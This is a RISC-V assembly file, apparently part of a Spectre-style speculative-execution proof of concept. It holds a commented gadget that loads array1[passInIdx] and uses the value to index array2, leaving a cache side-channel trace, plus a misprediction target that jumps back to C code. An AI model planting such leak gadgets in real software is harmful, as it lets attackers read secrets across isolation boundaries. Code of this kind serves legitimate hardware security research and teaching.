.section .text
    .global gadget
    .global want
    .extern end

# Gadget function: Executed speculatively.
# Reads a value from array1 based on passInIdx, then uses that value
# to calculate an address within array2 and performs a load from array2.
# This load into array2 creates the cache side-channel leakage.
gadget:
    la a4,  array1          # Load base address of array1 into a4
    ld a5,  passInIdx       # Load the value of passInIdx into a5 (index for array1)
    add a5, a5, a4          # Calculate address: array1 + index
    lbu a5, 0(a5)           # Load byte value: data = array1[index]
    # --- Calculate offset for array2 based on loaded data ---
    # sext.w a5, a5         # Optional: Sign extend byte to word (Effect depends on context/compiler)
    slliw a5, a5, 0x6       # Shift left by 6 (data * 64, assuming L1 block size is 64)
    sext.w a5, a5         # Sign extend resulting word offset to 64 bits for address calculation
    # --- Access array2 ---
    la a4,  array2          # Load base address of array2 into a4
    add a5, a5, a4          # Calculate address: array2 + offset
    lbu a5, 0(a5)           # Load byte from array2 at the calculated address (cache side-channel trigger)
    # The loaded value itself (in a5) isn't used further here.

# Target function for branch misprediction.
# If the JALR in C code mispredicts to here, it simply jumps back to the 'end' label.
want:
    nop                     # No operation (placeholder)
    j   end                 # Jump unconditionally to the 'end' label (after the JALR)